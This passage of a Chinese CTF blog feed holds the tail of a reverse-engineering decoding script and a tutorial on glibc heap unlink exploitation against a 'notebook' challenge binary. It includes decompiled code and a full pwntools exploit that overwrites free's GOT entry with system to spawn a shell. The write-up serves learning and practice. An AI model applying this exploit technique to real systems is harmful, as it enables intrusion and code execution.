<span class="number">0x28</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x82</span> , <span class="number">0x43</span> , <span class="number">0x1e</span> , <span class="number">0x1e</span> , <span class="number">0x32</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0x9e</span> , <span class="number">0x42</span> , <span class="number">0x0</span> , <span class="number">0x0</span> , <span class="number">0xf</span> , <span class="number">0x43</span>]</span><br><span class="line"></span><br><span class="line">ar3 = []</span><br><span class="line"></span><br><span class="line">v10 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ar1), <span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    wtf = (ar1[i<span class="number">-1</span>]*<span class="number">0x1000000</span> + ar1[i<span class="number">-2</span>]*<span class="number">0x10000</span> + ar1[i<span class="number">-3</span>]*<span class="number">0x100</span> + ar1[i<span class="number">-4</span>])</span><br><span class="line">    ar3.append(wtf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ar2), <span class="number">-1</span>, <span class="number">-3</span>):</span><br><span class="line">    <span class="keyword">if</span> i+<span class="number">1</span> &gt; len(ar2):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> ar2[i + <span class="number">1</span>] &gt;= len(ar3):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> ar2[i] == <span class="number">2</span>:</span><br><span class="line">        s = hex(ar3[ar2[i + <span class="number">1</span>]]).replace(<span class="string">"0x"</span>, <span class="string">""</span>)</span><br><span class="line">        tmp = struct.unpack(<span class="string">'&gt;f'</span>, bytes.fromhex(s))[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> v10[ar2[i + <span class="number">1</span>]] == <span class="number">0</span>:</span><br><span class="line">            v10[ar2[i + <span class="number">1</span>]] = ar2[i+<span class="number">2</span>] + tmp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v10[ar2[i + <span class="number">1</span>]] += ar2[i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> ar2[i] == <span class="number">3</span>:</span><br><span class="line">        s = hex(ar3[ar2[i + <span class="number">1</span>]]).replace(<span class="string">"0x"</span>, <span class="string">""</span>)</span><br><span class="line">        tmp = struct.unpack(<span class="string">'&gt;f'</span>, bytes.fromhex(s))[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> v10[ar2[i + <span class="number">1</span>]] == <span class="number">0</span>:</span><br><span class="line">            v10[ar2[i + <span class="number">1</span>]] = tmp / ar2[i+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v10[ar2[i + <span class="number">1</span>]] /= ar2[i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> ar2[i] == <span class="number">4</span>:</span><br><span class="line">        s = hex(ar3[ar2[i + <span class="number">1</span>]]).replace(<span class="string">"0x"</span>, <span class="string">""</span>)</span><br><span class="line">        tmp = struct.unpack(<span class="string">'&gt;f'</span>, bytes.fromhex(s))[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> v10[ar2[i + <span class="number">1</span>]] == <span class="number">0</span>:</span><br><span class="line">            v10[ar2[i + <span class="number">1</span>]] = ar2[i+<span class="number">2</span>] * tmp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v10[ar2[i + <span class="number">1</span>]] *= ar2[i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> ar2[i] == <span class="number">1</span>:</span><br><span class="line">        s = hex(ar3[ar2[i + <span class="number">1</span>]]).replace(<span class="string">"0x"</span>, <span class="string">""</span>)</span><br><span class="line">        tmp = struct.unpack(<span class="string">'&gt;f'</span>, bytes.fromhex(s))[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> v10[ar2[i + <span class="number">1</span>]] == <span class="number">0</span>:</span><br><span class="line">            v10[ar2[i + <span class="number">1</span>]] = tmp - ar2[i+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v10[ar2[i + <span class="number">1</span>]] -= ar2[i+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v10:</span><br><span class="line">    print(chr(int(i)%<span class="number">256</span>), end = <span class="string">""</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;先总结一波吧。这次比赛我真的是菜的扣脚，就做出两道题，和北邮的师傅根本比不了，北邮的pwn师傅真的太强了。真的膜拜，orz。&lt;br&gt;感觉这次比赛暴露了自己很多缺点，关于最近新学的堆应用根本不灵活，存在的遗憾就是第二天的pwn没做好吧，感觉自己能做，但是却偏偏卡在最后了，只能
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.github.io/categories/Writeup/"/>
    
    
      <category term="pwn" scheme="http://Whali3n51.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出的unlink漏洞利用</title>
    <link href="http://whali3n51.github.io/2019/06/04/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://whali3n51.github.io/2019/06/04/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2019-06-04T06:41:00.000Z</published>
    <updated>2020-01-08T07:11:30.454Z</updated>
    
    <content type="html"><![CDATA[<p>用实例来讲解unlink以及unlink的使用条件。<br>首先我们拿到程序notebook<br>我们开始分析这个例子<br>首先查看这个程序的保护机制<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>没有开启PIE，证明这一题可以得到bss段的地址。<br>然后进入IDA<br>首先进入创建堆块的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-8h]@5</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+Ch] [bp-4h]@3</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter the lenth of notebook:"</span>);</span><br><span class="line">    LODWORD(v0) = my_atoi();</span><br><span class="line">    v3 = v0;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = qword_6020A8[<span class="number">2</span> * i];</span><br><span class="line">        <span class="keyword">if</span> ( !v0 )</span><br><span class="line">        &#123;</span><br><span class="line">          unk_6020A0[<span class="number">4</span> * i] = v3;</span><br><span class="line">          qword_6020A8[<span class="number">2</span> * i] = <span class="built_in">malloc</span>(v3);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"input the content:"</span>);</span><br><span class="line">          sub_4008CB(qword_6020A8[<span class="number">2</span> * i], v3);</span><br><span class="line">          ++number;</span><br><span class="line">          LODWORD(v0) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"sorry,invalid lenth"</span>);</span><br><span class="line">      LODWORD(v0) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"this is no space "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这个函数的将创建堆块的地址放在一个全局变量的结构体数组里面。这个结构体的样子是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Struct note</span><br><span class="line">&#123;</span><br><span class="line">int64 <span class="built_in">size</span>;</span><br><span class="line">Int64* content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体的大小固定，但是content堆块的大小任我们决定。但是输入的时候有检测，不能造成堆溢出。<br>然后进入修改堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [sp+Bh] [bp-5h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter the index of notebook:"</span>);</span><br><span class="line">    v2 = my_atoi();</span><br><span class="line">    <span class="keyword">if</span> ( qword_6020A8[<span class="number">2</span> * (<span class="keyword">unsigned</span> __int64)v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"enter the lenth of notebook:"</span>);</span><br><span class="line">      v0 = my_atoi();</span><br><span class="line">      sub_4008CB(qword_6020A8[<span class="number">2</span> * (<span class="keyword">unsigned</span> __int64)v2], v0);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid notebook"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数首先在已有的堆块上面进行更改，但是我们输入的字节大小长度是任意的。所以这里存在堆溢出。当我们输入的大小长度超过了堆块的大小，就造成了溢出。<br>然后就再进入打印函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v0; <span class="comment">// al@2</span></span><br><span class="line">  __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [sp+Fh] [bp-1h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter the index:"</span>);</span><br><span class="line">    v0 = my_atoi();</span><br><span class="line">    v2 = v0;</span><br><span class="line">    result = qword_6020A8[<span class="number">2</span> * (<span class="keyword">unsigned</span> __int64)v0];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d:%s\n"</span>, v2, qword_6020A8[<span class="number">2</span> * (<span class="keyword">unsigned</span> __int64)v2]);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数就是简单的打印出content堆块的信息<br>在进入释放堆块的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@3</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter the index:"</span>);</span><br><span class="line">    v1 = my_atoi();</span><br><span class="line">    <span class="keyword">if</span> ( qword_6020A8[<span class="number">2</span> * v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_6020A8[<span class="number">2</span> * v1]);</span><br><span class="line">      qword_6020A8[<span class="number">2</span> * v1] = <span class="number">0L</span>L;</span><br><span class="line">      unk_6020A0[<span class="number">4</span> * v1] = <span class="number">0</span>;</span><br><span class="line">      --number;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"success"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid notebook"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invalid choice"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数就是将输入的序号对应的堆块删除然后将结构体清零。<br>这一题我们解题思路就是我们能直接操作堆块，而且堆块存放的地址我们能知道（在bss段），并且存在堆溢出，所以我们能触发unlink漏洞，并且触发unlink漏洞之后我们能够控制一个指针，通过这个指针我们能过覆盖got的free地址。<br>然后我的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./notebook'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./notebook'</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'your choice?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'enter the lenth of notebook:\n'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'input the content:\n'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'your choice?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'enter the index of notebook:\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'enter the lenth of notebook:\n'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'your choice?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'enter the index:\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'your choice?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'enter the index:\n'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'aaaaa'</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'ccccccc'</span>)<span class="comment">#控制大小，能触发unlink</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#构造能进入shell的条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">array=<span class="number">0x6020A0</span>+<span class="number">8</span>+<span class="number">0x10</span><span class="comment">#存放id=1的content地址</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(array<span class="number">-0x18</span>)+p64(array<span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)<span class="comment">#伪装为free chunk</span></span><br><span class="line">payload+=(<span class="number">0x30</span>-len(payload))*<span class="string">'a'</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)<span class="comment">#使id=2的content堆块相信前面是free chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#触发unlink</span></span><br><span class="line"><span class="comment">#这个时候id=1的content指针指向id=0的size</span></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0x30</span>)<span class="comment">#覆盖id=0的size和content，将content指针改为free的got地址。</span></span><br><span class="line">edit(<span class="number">1</span>,len(payload)+<span class="number">2</span>,payload)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#将free的真实地址泄露出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面就是得到free真实地址，计算出system真实地址</span></span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">index=p.recv(<span class="number">6</span>)</span><br><span class="line">free_addr=u64(index.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(free_addr)</span><br><span class="line">libc_base=free_addr-libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(system_addr)<span class="comment">#将got上的free的真实地址改为system真实地址</span></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)<span class="comment">#触发system函数，进入shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;用实例来讲解unlink以及unlink的使用条件。&lt;br&gt;首先我们拿到程序notebook&lt;br&gt;我们开始分析这个例子&lt;br&gt;首先查看这个程序的保护机制&lt;br&gt;    Arch:     amd64-64-little&lt;br&gt;    RELRO:    Partial R
      
    
    </summary>
    
    
      <category term="pwn总结" scheme="http://Whali3n51.github.io/categories/pwn%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="unlink" scheme="http://Whali3n51.github.io/tags/unlink/"/>
    
  </entry>
  
</feed>
